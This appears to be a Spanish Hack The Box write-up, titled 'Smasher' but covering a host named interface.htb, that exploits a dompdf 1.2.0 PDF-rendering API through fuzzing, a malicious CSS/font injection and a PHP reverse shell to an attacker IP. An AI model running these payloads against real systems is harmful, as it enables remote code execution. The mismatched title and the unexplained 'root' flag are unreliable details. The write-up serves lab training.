---
layout: single
title: Smasher - Hack The Box
date: 2023-06-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-smasher/smasher.png
categories:
  - hackthebox
tags:
  - hackthebox
  - binary exploit  
---
## NMAP 

```
❯ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.129.168.179

Nmap scan report for 10.129.228.208
Host is up, received user-set (0.16s latency).
Scanned at 2023-06-10 11:29:08 EDT for 14s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

```

```
❯ nmap -sCV -p22,80 10.129.168.179 -oN versionports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 11:30 EDT
Nmap scan report for 10.129.228.208
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site Maintenance

```

Viendo que el puerto 80 ire directamente a buscar algo ahi, el puerto 22 quedara en segundo plano porque aun no poseo credenciales entonces seria perder un poco el tiempo a mi parecer, al momento de realizar un *curl* a la web de la maquina no veo mas que un extenso de configuracion sobre la pagina de presentacion que tiene pinta de estar hecho con JavaScript. No encuentro mucho en eso, pero suelo usar un parametro *-v* con curl para poder ver los headers de la peticion realizara y aqui encontre un subdominio

```
❯ curl -v http://10.129.168.179
> GET / HTTP/1.1
> Host: 10.129.168.179
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 200 OK
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sat, 10 Jun 2023 19:14:29 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 6359
< Connection: keep-alive
< Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
< X-Powered-By: Next.js
< ETag: "i8ubiadkff4wf"
< Vary: Accept-Encoding
< 
					AQUI DEBERIA IR EL CODIGO QUE PERMITE LA PRESENTACION DE LA PAGINA WEB PRINCIPAL
```

No opte por colocar todo el codigo porque seria muy extenso y lo que considero importante es parte de la cabecera de la peticion en especifico el *Content-Security-Policy*, apartado el cual contiene un subdominio relacionado con la pagina web de la maquina: *prd.m.rendering-api.interface.htb*

Si realizo un *ping* al subdominio pero no encuentro una conexion 

```
❯ ping -c 1 prd.m.rendering-api.interface.htb
ping: prd.m.rendering-api.interface.htb: Name or service not known
```
Directamente pienso que se esta realizando Virtual Hosting asi que procedere a agregar este subdominio a /etc/hosts para para poder tener la conectividad, y volver a probar un ping 

```
❯ ping -c 1 prd.m.rendering-api.interface.htb
PING interface.htb (10.129.168.179) 56(84) bytes of data.
64 bytes from interface.htb (10.129.168.179): icmp_seq=1 ttl=63 time=154 ms

--- interface.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
```

Ya identifique un domino el interface.htb y el subdominio prd.m.rendering-api.interface.htb, directamente ire a realizar un ataque de fuzzing para descubrir si hay directorios ocultos que podria tener la web

```
❯ wfuzz -c --hc 404 -u http://10.129.228.208/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.168.179/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000013:   200        1 L      111 W      6351 Ch     "#"                                                                                                                      
000000014:   200        1 L      111 W      6351 Ch     "http://10.129.168.179/"                                                                                                 
000000003:   200        1 L      111 W      6351 Ch     "# Copyright 2007 James Fisher"                                                                                          
000045240:   200        1 L      111 W      6351 Ch     "http://10.129.168.179/" 
```
 no encontre nada en la url interface.htb, hice otro fuzz para intentar descubrir un subdominio diferente al  *prd.m.rendering-api.interface.htb*, pero el resultado fue negativo de igual forma.
```
❯ wfuzz -c --hh 6351 -u http://interface.htb -H "Host: FUZZ.interface.htb" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://interface.htb/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000007:   400        7 L      13 W       182 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                        
000000009:   400        7 L      13 W       182 Ch      "# Suite 300, San Francisco, California, 94105, USA."    
```

Probare con fuzzear nuevo dominios ocultos para el subdominio presentado que sabemos es valido, no suelo ocultar el codigo 404 a primera instancia tal vez por costumbre o buena suerte en este caso, note que el 404 devolvia 0 lineas y 0 caracteres lo cual no suele ser algo normal, volvere a intentar lanzar la linea de comando pero ocultado las respuestas que devuelven 0 caracteres.

```
❯ wfuzz -c -u http://prd.m.rendering-api.interface.htb/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000017:   404        0 L      0 W        0 Ch        "download"                                                                                                               
000000013:   404        1 L      3 W        16 Ch       "#"                                                                                                                      
000000020:   404        0 L      0 W        0 Ch        "crack"                                                                                                                  
000000007:   404        1 L      3 W        16 Ch       "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                        
000000015:   404        0 L      0 W        0 Ch        "index"                                                                                                                  
000000016:   404        0 L      0 W        0 Ch        "images"                                                                                                                 
000000021:   404        0 L      0 W        0 Ch        "serial"
```


En el nuevo fuzzeo que realice al subdominio para encontrar directorios dentro si obtuve resultados ocultanto el codigos que me devolvia 0 y 6351 caracteres 

```
❯ wfuzz -c --hh 0,6351 -u http://prd.m.rendering-api.interface.htb/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000014:   404        1 L      3 W        16 Ch       "http://prd.m.rendering-api.interface.htb/"                                                                              
000000004:   404        1 L      3 W        16 Ch       "#"                                                                                                                      
000001481:   403        1 L      2 W        15 Ch       "vendor"                                                                                                                 
000001026:   404        0 L      3 W        50 Ch       "api"                                                                                                                    
000045240:   404        1 L      3 W        16 Ch       "http://prd.m.rendering-api.interface.htb/"
```

Bueno realice el nuevo fuzzing encontre una nueva subcarpeta dentro de /vendor llamada /composer pero mas alla de ello no encontre nada ahora fuzzeare la subcarpeta /api a ver que puede contener oculto y al final si encontre algo 

```
wfuzz -c -X POST --hh 50 -u http://prd.m.rendering-api.interface.htb/api/FUZZ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 150
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000026856:   502        7 L      13 W       182 Ch      "Artwork"                                                                                                                
000136674:   422        0 L      2 W        36 Ch       "html2pdf"                                                                                                               
```

y mira que tenemos  /html2pdf  aqui juntamos y realizamos un *curl* para poder ver que contiene la pagina me interesa ver la cabecera de la peticion, porque si la mando desde el navegador web el resultado es el siguiente


Consultando algo sobre Pentesting Api resulta que las peticiones se deberian probrar con otro metodo de peticion como GET, POST, PUT, DELETE, PATCH, INVENTED. Aunque a mi igual a primera me sirvio pobrar una peticion por metodo de peticion POST

```
❯ curl -v -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf
> POST /api/html2pdf HTTP/1.1
> Host: prd.m.rendering-api.interface.htb
> User-Agent: curl/7.88.1
> Accept: */*
> 
< HTTP/1.1 422 Unprocessable Entity
< Server: nginx/1.14.0 (Ubuntu)
< Date: Sat, 10 Jun 2023 23:46:36 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
* Connection #0 to host prd.m.rendering-api.interface.htb left intact
{"status_text":"missing parameters"}% 
```
Bien como nos faltan parametros y no se cuales son, lo que hare es un fuzzing a estos parametros y obtenemos un respuesta

```
❯ wfuzz -c --hh 36 -X POST -d '{"FUZZ":"FUZZ"}' -u http://prd.m.rendering-api.interface.htb/api/html2pdf -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 150
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://prd.m.rendering-api.interface.htb/api/html2pdf
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000092:   200        0 L      0 W        0 Ch        "html - html" 
```

Por ende los parametros faltantes serian {"html":"Cualquier_cosa"}, teniendo este podemos realizar de nuevo el *curl* completando los parametros faltantes, recalco que estuve dando vueltas unos minutos porque no me colocaba el ouput que deberia haber en un archivo que especifique la solucion fue camibiar el metodo de POST  a GET o no ponerle metodo a *curl* que por defecto lo hace por el segundo mencionado.

```
❯ curl -i -X GET http://prd.m.rendering-api.interface.htb/api/html2pdf -H "Content-Type: application/json" -d '{"html":"HOLA"}' --output archivos.pdf
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    65    0    50  100    15    158     47 --:--:-- --:--:-- --:--:--   206
```


```
❯ cat file.pdf
%PDF-1.7
1 0 obj
<< /Type /Catalog
/Outlines 2 0 R
/Pages 3 0 R >>
endobj
2 0 obj
<< /Type /Outlines /Count 0 >>
endobj
3 0 obj
<< /Type /Pages
/Kids [6 0 R
]
/Count 1
/Resources <<
/ProcSet 4 0 R
/Font << 
/F1 8 0 R
>>
>>
/MediaBox [0.000 0.000 419.530 595.280]
 >>
endobj
4 0 obj
[/PDF /Text ]
endobj
5 0 obj
<<
/Producer (dompdf 1.2.0 + CPDF)
/CreationDate (D:20230611011611+00'00')
/ModDate (D:20230611011611+00'00')
>>
endobj
6 0 obj
<< /Type /Page
/MediaBox [0.000 0.000 419.530 595.280]
/Parent 3 0 R
/Contents 7 0 R
>>
endobj
7 0 obj
<< /Filter /FlateDecode
/Length 75 >>
stream
x2300P@&ҹBM

           L,L-BR


                 B5<sR5cB\C~_
endstream
endobj
8 0 obj
<< /Type /Font
/Subtype /Type1
/Name /F1
/BaseFont /Times-Roman
/Encoding /WinAnsiEncoding
>>
endobj
xref
0 9
0000000000 65535 f 
0000000009 00000 n 
0000000074 00000 n 
0000000120 00000 n 
0000000274 00000 n 
0000000303 00000 n 
0000000452 00000 n 
0000000555 00000 n 
0000000701 00000 n 
trailer
<<
/Size 9
/Root 1 0 R
/Info 5 0 R
/ID[<35e3bd45fd8d550c68e51392884d9200><35e3bd45fd8d550c68e51392884d9200>]
>>
startxref
810
%%EOF
```


Analizando por encima el output del archivo obtenido podemos ver algo que parece ser una version ```dompdf 1.2.0```  Buscando en internet si puede haber alguna vulnerabilidad para esta version y la hay 

[https://github.com/positive-security/dompdf-rce](https://github.com/positive-security/dompdf-rce)

Esta clara la forma en la que hay que usar los comandos ya que no es un script automatizado como tal porque nosotros debemos hacer parte para que esta vulnerabilidad funcione, al traer el repositorio a nuestra maquina podemos ver que tenemos dos archivos 

Dentro del archivo tendremos un simple phpinfo() para comprobar si nuestra ejecucion funciona.

El siguiente paso es realizar una peticion para que la web de la maquina victima realice otra peticion de por medio a un servidor que nosotros vamos montar con python3 en primer lugar el servidor

```
python3 -m http.server 9001
```

Ahora nos dirigiremos a realizar la peticion con *curl*, que llamara al archivo exploit2.css para que mediante codigo .css llame al archivo exploit_font.php 

```
curl -s -X POST http://prd.m.rendering-api.interface.htb/api/html2pdf -H "Content-Type: application/pdf" -d '{"html":"<link rel=stylesheet href='http://10.10.14.115:9001/exploit2.css'>"}'
```

Vemos que tenemos una peticion que se realizo con exito



Ahora lo que debemos hacer es buscar el archivo en la web que en teoria deberia estar subido, en el repositorio nos comenta que debemos buscarlo por una ruta especifica, pero antes necesitamos un dato especifico en la url que debemos buscar hay un hash md5 el cual debemos adaptarlo a nuestro favor usaremos 


```
❯ echo -n "http://10.10.14.115:9001/exploit_font.php" | md5sum
2e5dfa90b70c16cb59ddd050de6a58dc 
```
El hash resultante lo agregamos a nuestra url para realizar la peticion

```
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_2e5dfa90b70c16cb59ddd050de6a58dc.php
```

A continuacion podremos ver que si funciona el script .php por ende procedera a configurar el script para que me devuelva una reverse shell 


configurando el archivo donde esta el script quedaria algo asi 

```php
<?php system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.115/4444 0>&1'"); ?>
```

Repetimos los mismos pasos, montamos nuestro servidor python, con *curl* subimos el archivo y lo buscamos en la url, agregando que esta vez deberiamos estar en escucha esperando nuestra reverseshell




estando dentro de la maquina con una reverse shell procederemos a configurarla para poder usarla de mejor manera con los siguientes comandos o al menos como lo hago yo porque de igual forma hay mas metodos


```
1. /usr/bin/script -qc /bin/bash /dev/null

2. Realizamos un Ctrl + Z

3. stty raw -echo; fg

4. reset xterm

5. export $TERM=xterm

```




## Shell root

	FLAG

797e3b57d4e103334daa1e704e461e68



